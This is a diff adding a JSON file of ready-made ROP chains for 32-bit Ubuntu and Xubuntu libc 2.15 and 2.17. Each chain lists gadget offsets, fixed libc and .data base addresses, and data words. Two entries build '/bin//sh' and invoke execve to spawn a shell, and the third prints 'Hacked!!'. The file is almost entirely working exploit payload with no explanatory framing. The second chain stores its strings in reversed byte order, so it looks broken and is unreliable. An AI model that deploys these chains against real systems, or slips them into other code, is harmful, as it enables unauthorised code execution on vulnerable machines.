@@ -1,0 +1,23 @@
+{"rop_codes":[
+    {
+        "id": 1,
+        "info": "Xubuntu 32-bit libc 2.17 shell spawn code",
+        "libc_base": "0xb7e18000",
+        "data_base": "0x0804a024",
+        "code": "ROP command: 0xf5160L: pop ecx ; pop eax ;;\nData       : 0x6e69622f: /bin\nAddress    : 0x4: Offset for /bin (.data base)\nROP command: 0x2e09fL: mov [eax] ecx ;;\nROP command: 0xf5160L: pop ecx ; pop eax ;;\nData       : 0x68732f2f: //sh\nAddress    : 0x8: Offset for //sh (.data base)\nROP command: 0x2e09fL: mov [eax] ecx ;;\nROP command: 0x34964L: xor eax eax ;;\nROP command: 0x2e8bbL: pop ecx ; pop edx ;;\nPadding    : 0x01010101: (To neutralize pop ecx)\nAddress    : 0xc: Offset for NULL (.data base)\nROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;\nROP command: 0xff102L: pop ecx ; pop ebx ;;\nAddress    : 0xc: Offset for NULL (.data base)\nAddress    : 0x4: Offset for /bin (.data base)\nROP command: 0x14da28L: add eax 0xb ;;\nROP command: 0xbaa75L: call dword [gs:0x10] ;;"
+    },
+    {
+        "id": 2,
+        "info": "Ubuntu 32-bit libc 2.15 shell spawn code",
+        "libc_base": "0xb7e20000",
+        "data_base": "0x0804a010",
+        "code": "ROP command: 0xf2d21L: pop ecx ; pop eax ;;\nData       : 0x2f62696e: /bin\nAddress    : 0x4: Offset for /bin (.data base)\nROP command: 0x2d71fL: mov [eax] ecx ;;\nROP command: 0xf2d21L: pop ecx ; pop eax ;;\nData       : 0x2f2f7368: //sh\nAddress    : 0x8: Offset for //sh (.data base)\nROP command: 0x2d71fL: mov [eax] ecx ;;\nROP command: 0x341a5L: xor eax eax ;;\nROP command: 0x2df7bL: pop ecx ; pop edx ;;\nPadding    : 0x01010101 (To neutralize pop ecx)\nAddress    : 0xc: Offset for NULL (.data base)\nROP command: 0x8d5e4L: mov [edx] eax ; mov eax edx ;;\nROP command: 0x341a5L: xor eax eax ;;\nROP command: 0xfca82L: pop ecx ; pop ebx ;;\nAddress    : 0xc: Offset for NULL (.data base)\nAddress    : 0x4: Offset for /bin (.data base)\nROP command: 0x148428L: add eax 0xb ;;\nROP command: 0xb8dc5L: call dword [gs:0x10] ;;"
+    },
+    {
+        "id": 3,
+        "info": "XUbuntu 32-bit libc 2.17 print Hacked!!",
+        "libc_base": "0xb7e18000",
+        "data_base": "0x0804b088",
+        "code": "ROP command: 0xf5160L: pop ecx ; pop eax ;;\nData   : 0x6b636148: Hack\nAddress: 0x4: Offset for Hack (.data base)\nROP command: 0x2e09fL: mov [eax] ecx ;;\nROP command: 0xf5160L: pop ecx ; pop eax ;;\nData   : 0x21216465: ed!!\nAddress: 0x8: Offset for ed!! (.data base)\nROP command: 0x2e09fL: mov [eax] ecx ;;\nROP command: 0x34964L: xor eax eax ;;\nROP command: 0x7d9f8L: mov eax 0x1 ;;\nROP command: 0x122339L: mov edx eax ; mov eax edx ;;\nROP command: 0xdf572L: mov ebx edx ;;\nROP command: 0x34964L: xor eax eax ;;\nROP command: 0x2e8bbL: pop ecx ; pop edx ;;\nAddress: 0x4: Offset for Hack (.data base)\nAddress: 0xc: Offset for NULL (.data base)\nROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;\nROP command: 0x34964L: xor eax eax ;;\nROP command: 0xa9a40L: mov eax 0x7 ;;\nROP command: 0x122339L: mov edx eax ; mov eax edx ;;\nROP command: 0x1369e7L: inc edx ;;\nROP command: 0x34964L: xor eax eax ;;\nROP command: 0xa9a10L: mov eax 0x4 ;;\nROP command: 0xbaa75L: call dword [gs:0x10] ;;"
+    }
+]}
